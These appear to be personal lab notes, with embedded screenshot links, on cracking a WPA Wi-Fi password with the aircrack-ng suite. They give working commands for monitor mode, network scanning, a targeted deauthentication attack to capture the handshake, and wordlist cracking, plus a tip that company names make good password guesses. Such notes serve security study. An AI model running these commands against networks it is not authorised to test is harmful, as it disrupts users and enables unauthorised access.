**==First of all in the VM we need to connect our wireless card. So we go to:==**
- `Player` -> `removable devices` -> name of card WLAN -> `connect`
- ![[Pasted image 20250110103603.png]]


At this point we can start with the attack.

# Place card in monitor mode

**==To start it we need to use==** `airmon-ng`

```bash
airmon-ng check kill
```
- it will stop all the processes that blocks our card to be in monitor mode
- ![[Pasted image 20250110103751.png]]


At this point we start the monitor mode:
```bash
airmon-ng start OUR_CARD
```
- ![[Pasted image 20250110103831.png]]

At this point our card changes name to `previous_name_mon`
- ![[Pasted image 20250110104127.png]]



We need the monitor mode to capture all the packets in the wireless range in which we are, so packets of other devices.


# Finding the network we want to attack
**==To do this we need to use==** `airodump-ng`

```bash
airodump-ng OUR_CARDmon 
```
- ![[Pasted image 20250110104227.png]]
- ![[Pasted image 20250110104153.png]]
- This will show us all the networks in our range

The higher the negative number the lower is the distance to the network.
- `-11` is better that `-44`



At this point we identified the `TP-Link`network, we want to attack it.

# monitor tp-link network
**==Now we have the info about the network and we want to monito it in order to capture the packets:==**
```bash
airodump-ng -c channel --bssid MAC_ADDRESS_BSSID -w output_file_name OUR_MONITOR_ADAPTER_NAME
```
- ![[Pasted image 20250110104801.png]]


<mark style="background: #FF5582A6;">At this point we can see the devices connected to the network. If there are no connected devices it may be:</mark>
- we are too far from the router
- no one is connected
- the attack cannot be done in this case


The attack we want to do is the `deauth attack`. 
1. we deauthenticate a device temporarely to force it to reconnect to the network
2. on the reconnection the router and the device do the the handshake
3. we caputure the EOAPL packets of the handshake (we want to crack it)


# Deauth attack
So we have this situation:
- ![[Pasted image 20250110105150.png]]

**==We open now a new terminal and we run:==**
```bash
aireplay-ng -0 5 -a BSSID_NETWORK -c STATION_MAC (the device connected to the router)  OUR_CARD_NAME
```
- `-0` is for `deauth`
- `5` is the number of deauth message we want to send
- ![[Pasted image 20250110105447.png]]
- ![[Pasted image 20250110105501.png]]

In general we can do it on the entire network, not only on one device.

When the device is deauthenticate and reconnects to the router we can capture the handshake:
- ![[Pasted image 20250110105650.png]]

So we can stop the command with `ctrl + c`


At this point we can pass to crack it.

# Handshake cracking

**==Now we just need a wordlist to crack the password.==**

```bash
aircrack-ng -w wordlist.txt -b BSSID_NETWORK capture_file.cap
```
- ![[Pasted image 20250110110201.png]]

It can take a lot of time, but when it is done we can retrieve the password in this way:
- ![[Pasted image 20250110110249.png]]



In general companies uses their name in the password, so we can leverage on it.


